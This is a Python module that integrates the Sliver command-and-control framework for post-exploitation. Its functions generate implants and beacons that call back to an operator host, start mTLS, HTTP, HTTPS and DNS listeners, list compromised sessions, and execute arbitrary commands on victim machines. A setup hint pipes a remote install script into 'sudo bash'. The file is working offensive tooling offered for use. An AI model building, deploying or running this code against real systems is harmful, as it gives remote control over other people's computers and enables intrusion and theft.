"""Sliver C2 Integration Module - Connects to Sliver server for post-exploitation"""
import logging
import asyncio
from typing import Dict, List, Any, Optional

logger = logging.getLogger(__name__)

_sliver_client = None
_sliver_connected = False


async def connect_sliver(config_path: str) -> bool:
    """Connect to Sliver C2 server using operator config"""
    global _sliver_client, _sliver_connected
    if not config_path:
        logger.info("Sliver config path not set, skipping connection")
        return False
    try:
        from sliver import SliverClientConfig, SliverClient
        config = SliverClientConfig.parse_config_file(config_path)
        _sliver_client = SliverClient(config)
        await _sliver_client.connect()
        _sliver_connected = True
        logger.info("Connected to Sliver C2 server")
        return True
    except ImportError:
        logger.warning("sliver-py not installed")
        return False
    except Exception as e:
        logger.warning(f"Sliver connection failed: {e}")
        _sliver_connected = False
        return False


def is_connected() -> bool:
    return _sliver_connected and _sliver_client is not None


async def get_status(config_path: str) -> Dict:
    """Get Sliver connection status"""
    if not config_path:
        return {
            "connected": False,
            "error": "SLIVER_CONFIG_PATH not set in .env",
            "hint": "1) Install Sliver: curl https://sliver.sh/install|sudo bash\n2) Run: sliver-server\n3) Generate operator: new-operator --name redteam --lhost 127.0.0.1\n4) Set SLIVER_CONFIG_PATH in .env to the generated config file"
        }
    if not _sliver_connected:
        connected = await connect_sliver(config_path)
        if not connected:
            return {
                "connected": False,
                "error": "Cannot connect to Sliver server",
                "hint": "Ensure sliver-server is running and config file is valid"
            }
    try:
        version = await _sliver_client.version()
        return {
            "connected": True,
            "version": f"{version.Major}.{version.Minor}.{version.Patch}",
            "config_path": config_path
        }
    except Exception as e:
        return {"connected": False, "error": str(e)}


async def list_sessions(config_path: str) -> List[Dict]:
    """List active Sliver sessions"""
    if not _sliver_connected:
        await connect_sliver(config_path)
    if not _sliver_client:
        return []
    try:
        sessions = await _sliver_client.sessions()
        return [{
            "id": s.ID,
            "name": s.Name,
            "hostname": s.Hostname,
            "username": s.Username,
            "os": s.OS,
            "arch": s.Arch,
            "transport": s.Transport,
            "remote_address": s.RemoteAddress,
            "pid": s.PID,
            "filename": s.Filename,
            "active_c2": s.ActiveC2,
            "reconnect_interval": s.ReconnectInterval,
            "type": "session"
        } for s in sessions]
    except Exception as e:
        logger.error(f"Sliver session list error: {e}")
        return []


async def list_beacons(config_path: str) -> List[Dict]:
    """List active Sliver beacons"""
    if not _sliver_connected:
        await connect_sliver(config_path)
    if not _sliver_client:
        return []
    try:
        beacons = await _sliver_client.beacons()
        return [{
            "id": b.ID,
            "name": b.Name,
            "hostname": b.Hostname,
            "username": b.Username,
            "os": b.OS,
            "arch": b.Arch,
            "transport": b.Transport,
            "remote_address": b.RemoteAddress,
            "pid": b.PID,
            "interval": b.Interval,
            "jitter": b.Jitter,
            "next_checkin": b.NextCheckin,
            "type": "beacon"
        } for b in beacons]
    except Exception as e:
        logger.error(f"Sliver beacon list error: {e}")
        return []


async def list_implants(config_path: str) -> List[Dict]:
    """List generated Sliver implants"""
    if not _sliver_connected:
        await connect_sliver(config_path)
    if not _sliver_client:
        return []
    try:
        implants = await _sliver_client.implant_builds()
        return [{
            "name": name,
            "os": build.GOOS,
            "arch": build.GOARCH,
            "format": build.Format,
            "c2": [f"{c.URL}" for c in build.C2],
            "type": "session" if not build.IsBeacon else "beacon"
        } for name, build in implants.items()]
    except Exception as e:
        logger.error(f"Sliver implant list error: {e}")
        return []


async def generate_implant(config_path: str, name: str, lhost: str, lport: int = 443, os_target: str = "linux", arch: str = "amd64", implant_type: str = "session", format_type: str = "executable") -> Dict:
    """Generate a Sliver implant/beacon"""
    if not _sliver_connected:
        await connect_sliver(config_path)
    if not _sliver_client:
        return {"error": "Not connected to Sliver"}
    try:
        from sliver.pb.clientpb import client_pb2
        if implant_type == "beacon":
            config = client_pb2.ImplantConfig(
                IsBeacon=True,
                Name=name,
                GOOS=os_target,
                GOARCH=arch,
                C2=[client_pb2.ImplantC2(URL=f"mtls://{lhost}:{lport}", Priority=0)],
                BeaconInterval=60,
                BeaconJitter=30,
            )
        else:
            config = client_pb2.ImplantConfig(
                IsBeacon=False,
                Name=name,
                GOOS=os_target,
                GOARCH=arch,
                C2=[client_pb2.ImplantC2(URL=f"mtls://{lhost}:{lport}", Priority=0)],
            )
        
        generated = await _sliver_client.generate_implant(config)
        return {
            "success": True,
            "name": name,
            "os": os_target,
            "arch": arch,
            "type": implant_type,
            "c2_url": f"mtls://{lhost}:{lport}",
            "size": len(generated.File.Data) if generated.File else 0,
            "file_name": generated.File.Name if generated.File else name
        }
    except Exception as e:
        return {"error": str(e)}


async def session_exec(config_path: str, session_id: str, command: str) -> Dict:
    """Execute command on a Sliver session"""
    if not _sliver_connected:
        await connect_sliver(config_path)
    if not _sliver_client:
        return {"error": "Not connected"}
    try:
        session = await _sliver_client.interact_session(session_id)
        parts = command.split()
        exe = parts[0]
        args = parts[1:] if len(parts) > 1 else []
        result = await session.execute(exe, args)
        return {
            "session_id": session_id,
            "command": command,
            "stdout": result.Stdout.decode() if result.Stdout else "",
            "stderr": result.Stderr.decode() if result.Stderr else "",
            "status": result.Status,
            "success": True
        }
    except Exception as e:
        return {"error": str(e), "success": False}


async def start_listener(config_path: str, lhost: str, lport: int = 443, protocol: str = "mtls") -> Dict:
    """Start a Sliver listener"""
    if not _sliver_connected:
        await connect_sliver(config_path)
    if not _sliver_client:
        return {"error": "Not connected"}
    try:
        if protocol == "mtls":
            job = await _sliver_client.start_mtls_listener(lhost, lport)
        elif protocol == "http":
            job = await _sliver_client.start_http_listener("", lhost, lport)
        elif protocol == "https":
            job = await _sliver_client.start_https_listener("", lhost, lport)
        elif protocol == "dns":
            job = await _sliver_client.start_dns_listener([lhost], False, False)
        else:
            return {"error": f"Unknown protocol: {protocol}"}
        
        return {
            "success": True,
            "job_id": job.JobID,
            "protocol": protocol,
            "host": lhost,
            "port": lport
        }
    except Exception as e:
        return {"error": str(e)}
